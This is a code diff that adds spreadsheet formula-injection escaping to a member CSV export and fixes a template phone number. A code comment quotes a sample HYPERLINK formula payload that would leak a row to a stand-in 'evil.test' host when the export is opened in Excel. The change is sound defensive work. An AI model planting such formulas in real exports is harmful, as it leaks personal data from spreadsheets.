@@ -1,6 +1,7 @@
 import Papa from "papaparse";
 
 import { memberInputSchema, type MemberInput } from "@/lib/validation/member";
+import { escapeCsvCell } from "@/lib/validation/text-safety";
 
 /**
  * Canonical import/export column order. The import template and the
@@ -189,7 +190,22 @@ export function membersToCsv(members: ExportableMember[]): string {
     death_fund_covered: m.deathFundCovered ? "yes" : "no",
     notes: m.notes ?? "",
   }));
-  return Papa.unparse(data, {
+
+  // `Papa.unparse` quotes and escapes for CSV *parsing*, but does nothing about
+  // spreadsheet formula execution: a member named `=HYPERLINK("http://evil
+  // .test?"&A1,"Click")` fires the moment an admin opens the export in Excel,
+  // leaking the row it sits in. Escaping happens here, on the way out, so
+  // stored values round-trip unchanged.
+  const safe = data.map((row) =>
+    Object.fromEntries(
+      Object.entries(row).map(([key, value]) => [
+        key,
+        typeof value === "string" ? escapeCsvCell(value) : value,
+      ]),
+    ),
+  );
+
+  return Papa.unparse(safe, {
     columns: ["member_id", ...CSV_HEADERS],
     newline: "\n",
   });
@@ -201,7 +217,9 @@ export function templateCsv(): string {
     first_name: "Ramesh",
     last_name: "Kumar",
     email: "ramesh@example.com",
-    phone: "9876543210",
+    // Not 9876543210: the importer rejects sequential runs as placeholder junk,
+    // so an example row using one would fail the moment staff filled it in.
+    phone: "9845011234",
     legacy_id: "MDPVA/OLD/123",
     profession: "photographer",
     business_name: "Ramesh Studio",
